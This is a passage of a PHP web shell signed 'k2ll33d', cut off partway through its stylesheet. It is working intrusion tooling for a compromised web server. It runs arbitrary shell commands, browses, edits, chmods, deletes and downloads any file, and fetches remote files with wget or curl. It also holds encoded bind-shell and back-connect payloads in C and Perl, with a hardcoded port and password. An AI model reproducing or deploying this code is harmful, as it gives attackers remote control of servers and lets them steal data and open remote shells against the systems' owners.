</html>
<?php
$site = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
// by k2ll33d / fb/k2ll33d
set_time_limit(0);
error_reporting(0);
if (isset($_GET["dl"]) && $_GET["dl"] != "") {
    $file = $_GET["dl"];
    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment;filename=" . basename($file) . ";");
    echo $filez;
    exit();
} elseif (isset($_GET["dlgzip"]) && $_GET["dlgzip"] != "") {
    $file = $_GET["dlgzip"];
    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip\n");
    header("Content-length: " . strlen($filez));
    header(
        "Content-disposition: attachment;filename=" . basename($file) . ".gz;"
    );
    echo $filez;
    exit();
}
if (isset($_GET["img"])) {
    @ob_clean();
    $d = magicboom($_GET["y"]);
    $f = $_GET["img"];
    $inf = @getimagesize($d . $f);
    $ext = explode($f, ".");
    $ext = $ext[count($ext) - 1];
    @header("Content-type: " . $inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: " . date("r", mktime(0, 0, 0, 1, 1, 2030)));
    @header("Cache-control: max-age=" . 60 * 60 * 24 * 7);
    @readfile($d . $f);
    exit();
}
$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = true;
} else {
    $safemode = false;
}
$system = @php_uname();
if (strtolower(substr($system, 0, 3)) == "win") {
    $win = true;
} else {
    $win = false;
}
if (isset($_GET["y"])) {
    if (@is_dir($_GET["view"])) {
        $pwd = $_GET["view"];
        @chdir($pwd);
    } else {
        $pwd = $_GET["y"];
        @chdir($pwd);
    }
}
if (!$win) {
    if (!($user = rapih(exe("whoami")))) {
        $user = "";
    }
    if (!($id = rapih(exe("id")))) {
        $id = "";
    }
    $prompt = $user . " \$ ";
    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
} else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user . " &gt;";
    $pwd = realpath(".") . "\\";
    $v = explode("\\", $d);
    $v = $v[0];
    foreach (range("A", "Z") as $letter) {
        $bool = @is_dir($letter . ":\\");
        if ($bool) {
            $letters .= "<a href='?y=" . $letter . ":\\'>[ ";
            if ($letter . ":" != $v) {
                $letters .= $letter;
            } else {
                $letters .= "<span class='gaya'>" . $letter . "</span>";
            }
            $letters .= " ]</a> ";
        }
    }
}
if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) {
    $posix = true;
} else {
    $posix = false;
}
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER["REMOTE_ADDR"];
$bindport = "13123";
$bindport_pass = "k2ll33d";
$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
$pwdurl = "";
for ($i = 0; $i < sizeof($pwds) - 1; $i++) {
    $pathz = "";
    for ($j = 0; $j <= $i; $j++) {
        $pathz .= $pwds[$j] . DIRECTORY_SEPARATOR;
    }
    $pwdurl .=
        "<a href='?y=" .
        $pathz .
        "'>" .
        $pwds[$i] .
        " " .
        DIRECTORY_SEPARATOR .
        " </a>";
}
if (isset($_POST["rename"])) {
    $old = $_POST["oldname"];
    $new = $_POST["newname"];
    @rename($pwd . $old, $pwd . $new);
    $file = $pwd . $new;
}
if (isset($_POST["chmod"])) {
    $name = $_POST["name"];
    $value = $_POST["newvalue"];
    if (strlen($value) == 3) {
        $value = 0 . "" . $value;
    }
    @chmod($pwd . $name, octdec($value));
    $file = $pwd . $name;
}
if (isset($_POST["chmod_folder"])) {
    $name = $_POST["name"];
    $value = $_POST["newvalue"];
    if (strlen($value) == 3) {
        $value = 0 . "" . $value;
    }
    @chmod($pwd . $name, octdec($value));
    $file = $pwd . $name;
}
$buff = "&nbsp;" . $software . "<br>";
$buff .= "&nbsp;" . $system . "<br>";
if ($id != "") {
    $buff .= "&nbsp;" . $id . "<br>";
}
if ($safemode) {
    $buff .=
        "&nbsp;safemode :&nbsp;<b><font style='color:#DD4736'>ON</font></b><br>";
} else {
    $buff .=
        "&nbsp;safemode :&nbsp;<b><font style='color:#00FF00'>OFF</font></b><br>";
}
function showstat($stat)
{
    if ($stat == "on") {
        return "<b><font style='color:#00FF00'>ON</font></b>";
    } else {
        return "<b><font style='color:#ff0000'>OFF</font></b>";
    }
}
function testmysql()
{
    if (function_exists("mysql_connect")) {
        return showstat("on");
    } else {
        return showstat("off");
    }
}
function testcurl()
{
    if (function_exists("curl_version")) {
        return showstat("on");
    } else {
        return showstat("off");
    }
}
function testwget()
{
    if (exe("wget --help")) {
        return showstat("on");
    } else {
        return showstat("off");
    }
}
function testperl()
{
    if (exe("perl -h")) {
        return showstat("on");
    } else {
        return showstat("off");
    }
}
$buff .=
    "&nbsp;MySQL: " .
    testmysql() .
    "&nbsp;|&nbsp;Perl: " .
    testperl() .
    "&nbsp;|&nbsp;cURL: " .
    testcurl() .
    "&nbsp;|&nbsp;WGet: " .
    testwget() .
    "<br>";
$buff .= "&nbsp;" . $letters . "&nbsp;&gt;&nbsp;" . $pwdurl;
function rapih($text)
{
    return trim(str_replace("<br>", "", $text));
}
function magicboom($text)
{
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}
function showdir($pwd, $prompt)
{
    $fname = [];
    $dname = [];
    if (
        function_exists("posix_getpwuid") &&
        function_exists("posix_getgrgid")
    ) {
        $posix = true;
    } else {
        $posix = false;
    }
    $user = "????:????";
    if ($dh = opendir($pwd)) {
        while ($file = readdir($dh)) {
            if (is_dir($file)) {
                $dname[] = $file;
            } elseif (is_file($file)) {
                $fname[] = $file;
            }
        }
        closedir($dh);
    }
    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
    $tree = @sizeof($path);
    $parent = "";
    $buff =
        " <form action='?y=" .
        $pwd .
        "&amp;x=shell' method='post' style='margin:8px 0 0 0;'><table class='cmdbox' style='width:50%;'><tr><td>$prompt</td><td><input onMouseOver='this.focus();' id='cmd' class='inputz' type='text' name='cmd' style='width:400px;' value='' /><input class='inputzbut' type='submit' value='execute !' name='submitcmd' style='width:80px;' /></td></tr></form><form action='?' method='get' style='margin:8px 0 0 0;'><input type='hidden' name='y' value='" .
        $pwd .
        "' /><tr><td>view file/folder</td><center><td><input onMouseOver='this.focus();' id='goto' class='inputz' type='text' name='view' style='width:400px;' value='" .
        $pwd .
        "' /><input class='inputzbut' type='submit' value='view !' name='submitcmd' style='width:80px;' /></td></center></tr></form></table><table class='explore'> <tr><th>name</th><th style='width:80px;'>size</th><th style='width:210px;'>owner:group</th><th style='width:80px;'>perms</th><th style='width:110px;'>modified</th><th style='width:190px;'>actions</th></tr> ";
    if ($tree > 2) {
        for ($i = 0; $i < $tree - 2; $i++) {
            $parent .= $path[$i] . DIRECTORY_SEPARATOR;
        };
    } else {
        $parent = $pwd;
    }
    foreach ($dname as $folder) {
        if ($folder == ".") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner =
                    $name["name"] .
                    "<span class='gaya'> : </span>" .
                    $group["name"];
            } else {
                $owner = $user;
            }
            $buff .=
                "<tr><td><a href=\"?y=" .
                $pwd .
                "\">$folder</a></td><td>-</td>
<td style=\"text-align:center;\">" .
                $owner .
                "</td>
<td><center>" .
                get_perms($pwd) .
                "</center></td>
<td style=\"text-align:center;\">" .
                date("d-M-Y H:i", @filemtime($pwd)) .
                "</td><td><span id=\"titik1\">
<a href=\"?y=$pwd&amp;edit=" .
                $pwd .
                "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
</span><form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"y\" value=\"" .
                $pwd .
                "\" /> 
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
</form></td></tr> ";
        } elseif ($folder == "..") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner =
                    $name["name"] .
                    "<span class=\"gaya\"> : </span>" .
                    $group["name"];
            } else {
                $owner = $user;
            }
            $buff .=
                "<tr><td>
<a href=\"?y=" .
                $parent .
                "\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'></a></td><td>-</td>
<td style=\"text-align:center;\">" .
                $owner .
                "</td>
<td><center>" .
                get_perms($parent) .
                "</center></td> <td style=\"text-align:center;\">" .
                date("d-M-Y H:i", @filemtime($parent)) .
                "</td>
<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=" .
                $parent .
                "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span> 
<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"y\" value=\"" .
                $pwd .
                "\" /> 
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
</form></td></tr>";
        } else {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner =
                    $name["name"] .
                    "<span class=\"gaya\"> : </span>" .
                    $group["name"];
            } else {
                $owner = $user;
            }
            $buff .=
                "<tr><td><a id=\"" .
                clearspace($folder) .
                "_link\" href=\"?y=" .
                $pwd .
                $folder .
                DIRECTORY_SEPARATOR .
                "\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />  $folder</a> 
<form action=\"?y=$pwd\" method=\"post\" id=\"" .
                clearspace($folder) .
                "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"oldname\" value=\"" .
                $folder .
                "\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" .
                $folder .
                "\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" .
                clearspace($folder) .
                "_form','" .
                clearspace($folder) .
                "_link');\" />
</form> </td><td>DIR</td><td style=\"text-align:center;\">" .
                $owner .
                "</td><td><center>
<a href=\"javascript:tukar('" .
                clearspace($folder) .
                "_link','" .
                clearspace($folder) .
                "_form3');\">" .
                get_perms($pwd . $folder) .
                "</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"" .
                clearspace($folder) .
                "_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"" .
                $folder .
                "\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"" .
                substr(sprintf("%o", fileperms($pwd . $folder)), -4) .
                "\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
onclick=\"tukar('" .
                clearspace($folder) .
                "_link','" .
                clearspace($folder) .
                "_form3');\" /></form></center></td><td style=\"text-align:center;\">" .
                date("d-M-Y H:i", @filemtime($folder)) .
                "</td><td><a href=\"javascript:tukar('" .
                clearspace($folder) .
                "_link','" .
                clearspace($folder) .
                "_form');\">rename</a>| <a href=\"?y=$pwd&amp;fdelete=" .
                $pwd .
                $folder .
                "\">delete</a>
</td>
</tr>";
        }
    }
    foreach ($fname as $file) {
        $full = $pwd . $file;
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner =
                $name["name"] .
                "<span class=\"gaya\"> : </span>" .
                $group["name"];
        } else {
            $owner = $user;
        }
        $buff .=
            "<tr><td><a id=\"" .
            clearspace($file) .
            "_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' /> $file</a> 
<form action=\"?y=$pwd\" method=\"post\" id=\"" .
            clearspace($file) .
            "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"oldname\" value=\"" .
            $file .
            "\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" .
            $file .
            "\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" .
            clearspace($file) .
            "_link','" .
            clearspace($file) .
            "_form');\" />
</form></td><td>" .
            ukuran($full) .
            "</td><td style=\"text-align:center;\">" .
            $owner .
            "</td><td><center>
<a href=\"javascript:tukar('" .
            clearspace($file) .
            "_link','" .
            clearspace($file) .
            "_form2');\">" .
            get_perms($full) .
            "</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"" .
            clearspace($file) .
            "_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"" .
            $file .
            "\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"" .
            substr(sprintf("%o", fileperms($full)), -4) .
            "\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" .
            clearspace($file) .
            "_link','" .
            clearspace($file) .
            "_form2');\" /></form></center></td>
<td style=\"text-align:center;\">" .
            date("d-M-Y H:i", @filemtime($full)) .
            "</td> 
<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('" .
            clearspace($file) .
            "_link','" .
            clearspace($file) .
            "_form');\">rename</a>| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
</td></tr>";
    }
    $buff .= "</table>";
    return $buff;
}
function ukuran($file)
{
    if ($size = @filesize($file)) {
        if ($size <= 1024) {
            return $size;
        } else {
            if ($size <= 1024 * 1024) {
                $size = @round($size / 1024, 2);
                return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024, 2);
                return "$size mb";
            }
        }
    } else {
        return "???";
    }
}
function exe($cmd)
{
    if (function_exists("system")) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists("exec")) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result;
        }
        return $buff;
    } elseif (function_exists("passthru")) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists("shell_exec")) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function tulis($file, $text)
{
    $textz = gzinflate(base64_decode($text));
    if ($filez = @fopen($file, "w")) {
        @fputs($filez, $textz);
        @fclose($file);
    }
}
function ambil($link, $file)
{
    if ($fp = @fopen($link, "r")) {
        while (!feof($fp)) {
            $cont .= @fread($fp, 1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file, "w");
        @fwrite($fp2, $cont);
        @fclose($fp2);
    }
}
function which($pr)
{
    $path = exe("which $pr");
    if (!empty($path)) {
        return trim($path);
    } else {
        return trim($pr);
    }
}
function download($cmd, $url)
{
    $namafile = basename($url);
    switch ($cmd) {
        case "wwget":
            exe(which("wget") . " " . $url . " -O " . $namafile);
            break;
        case "wlynx":
            exe(which("lynx") . " -source " . $url . " > " . $namafile);
            break;
        case "wfread":
            ambil($wurl, $namafile);
            break;
        case "wfetch":
            exe(which("fetch") . " -o " . $namafile . " -p " . $url);
            break;
        case "wlinks":
            exe(which("links") . " -source " . $url . " > " . $namafile);
            break;
        case "wget":
            exe(which("GET") . " " . $url . " > " . $namafile);
            break;
        case "wcurl":
            exe(which("curl") . " " . $url . " -o " . $namafile);
            break;
        default:
            break;
    }
    return $namafile;
}
function get_perms($file)
{
    if ($mode = @fileperms($file)) {
        $perms = "";
        $perms .= $mode & 00400 ? "r" : "-";
        $perms .= $mode & 00200 ? "w" : "-";
        $perms .= $mode & 00100 ? "x" : "-";
        $perms .= $mode & 00040 ? "r" : "-";
        $perms .= $mode & 00020 ? "w" : "-";
        $perms .= $mode & 00010 ? "x" : "-";
        $perms .= $mode & 00004 ? "r" : "-";
        $perms .= $mode & 00002 ? "w" : "-";
        $perms .= $mode & 00001 ? "x" : "-";
        return $perms;
    } else {
        return "??????????";
    }
}
function clearspace($text)
{
    return str_replace(" ", "_", $text);
}
$port_bind_bd_c =
    "bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl =
    "ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect =
    "fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c =
    "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
?>
<html><head><title>k2ll33d</title><link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<script type="text/javascript">
function tukar(lama,baru){document.getElementById(lama).style.display = 'none';
document.getElementById(baru).style.display = 'block';}
</script>
<style>.title{font-weight:bold;letter-spacing:1px;font-family: "orbitron";color: #00ff00;font-size:20px;text-shadow: 5px 5px 5px black;}input[type=text]{-moz-box-shadow:0 0 1px black;-webkit-box-shadow:0 0 1px black;height:18px;margin-left: 5px;}input:focus, textarea:focus ,button:active{box-shadow: 0 0 5px #4C83AF;-webkit-box-shadow: 0 0 5px rgba(0, 0, 255, 1);-moz-box-shadow: 0 0 5px rgba(0, 0, 255, 1);background:#222222;overflow: auto;}#menu{font-family:orbitron;background: #111111;margin:5px 2px 4px 2px;}div #menu li:hover {cursor:pointer;}div#menu li:hover>ul a:hover{width:118;background:red;}div#menu ul {margin:0;padding:0;float:left;-moz-border-radius: 6px; border-radius: 12px; border:1px solid #555555;}div#menu li {position:relative;display:block;float:left;}div#menu li:hover>ul {left:0px;border-left:1px solid white;}div#menu a{display:block;float:left;font-family:orbitron;padding:4px 6px;margin:0;text-decoration:none;letter-spacing:1px;color:white;}div#menu a:hover{background:rgba(160, 82, 45,0.3);font-family:orbitron;border-bottom:0px;}div#menu ul ul {position:absolute;top:18px;left:-990em;width:130px;padding:5px 0 5px 0;background:black;margin-top:2px;}div#menu ul ul a {padding:2px 2px 2px 10px;height:20px;float:none;display:block;color:white;}.k2ll33d2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #00ff00;font-size:25px;text-shadow: 5px 5px 5px black;} .mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #EC4D00; padding:4px 2px;width:70%;line-height:24px;background:#111111;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ffffff;-moz-box-shadow: 0px 4px 2px #ffffff;}.myboxtbl{ width:50%; }body{background:#010101;} a {text-decoration:none;} hr, a:hover{border-bottom:1px solid #4C83AF;} *{text-shadow: 0pt 0pt 0.3em rgb(153, 153, 153);font-size:11px;font-family:Tahoma,Verdana,Arial;color:#FFFFFF;} .tabnet{margin:15px auto 0 auto;border: 1px solid #333333;} .main {width:100%;} .gaya {color: #888888;} .top{border-left:1px solid #4C83AF;border-RIGHT:1px solid #4C83AF;font-family:verdana;} .inputz, option{outline:none;transition: all 0.20s ease-in-out;-webkit-transition: all 0.20s ease-in-out;-moz-transition: all 0.20s ease-in-out;border:1px solid rgba(0,0,0, 0.2);background:#111111; border:0; padding:2px; border-bottom:1px solid #393939; font-size:11px; color:#ffffff; -moz-border-radius: 6px; border-radius: 12px; border:1px solid #4C83AF;margin:4px 0 8px 0;} .inputzbut{background:#111111;color:#8f8f8f;margin:0 4px;border:1px solid #555555;}  .inputzbut:hover{background:#222222;border-left:1px solid #4C83AF;border-right:1px solid #4C83AF;border-bottom:1px solid #4C83AF;border-top:1px solid #4C83AF;}.inputz:hover{ -moz-border-radius: 6px; border-radius: 10px; border:1px solid #4C83AF;margin:4px 0 8px 0;border-bottom:1px solid #4C83AF;border-top:1px solid #4C83AF;}.output2 {margin:auto;border:1px solid #888888;background:#000000;padding:0 2px;} textarea{margin:auto;border:2px solid #555555;background:#000000;padding:0 2px;} .output {margin:auto;border:1px solid #303030;width:100%;height:400px;background:#000000;padding:0 2px;} .cmdbox{width:100%;}.head_info{padding: 0 4px;} .b1{font-size:30px;padding:0;color:#555555;} .b2{font-size:30px;padding:0;color:#800000;} .b_tbl{text-align:center;margin:0 4px 0 0;padding:0 4px 0 0;border-right:1px solid #333333;} .phpinfo table{width:100%;padding:0 0 0 0;} .phpinfo td{background:#111111;color:#cccccc;padding:6px 8px;;} .phpinfo th, th{background:#191919;border-bottom:1px solid #333333;font-weight:normal;} .phpinfo h2, .phpinfo h2 a{text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:#222222;padding:4px 0;} .explore{width:100%;} .explore a {text-decoration:none;} .explore td{border-bottom:1px solid #454545;padding:0 8px;line-height:24px;} .explore 